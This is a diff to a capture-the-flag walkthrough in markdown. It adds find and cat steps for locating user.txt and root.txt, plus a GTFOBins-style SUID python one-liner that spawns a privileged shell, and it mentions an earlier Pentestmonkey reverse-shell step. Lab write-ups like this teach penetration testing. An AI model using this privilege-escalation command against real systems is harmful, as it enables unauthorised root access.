@@ -59,10 +59,24 @@ the suggested reverse shel for this experiment is a shell by ***Pentestmonkey***
 ### • 8. Now to find our desired file we have to rrun a find command like
 
     find / -type f -name user.txt 2> /dev/null
+ or 
+ 
+    find / -type f -name user.txt
+
+
+    
    now we just have to cat the result 
 
      cat /var/www/user.txt
 
 ### • 9. Privilege Esclation
 
-   to gain root acess we have to run a privilege esclation command to find th ecode we gtg at GFTOBins [website](https://gtfobins.github.io/)
+   To gain root acess we have to run a privilege esclation command to find th ecode we gtg at GFTOBins [Website](https://gtfobins.github.io/), and run the given command
+         
+        python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Now we are root user to confirm tht ewe have to use ***whoami*** command 
+ now to find the root.txt file we simply have to use
+
+    find / -type f -name root.txt 
+    cat /root/root.txt
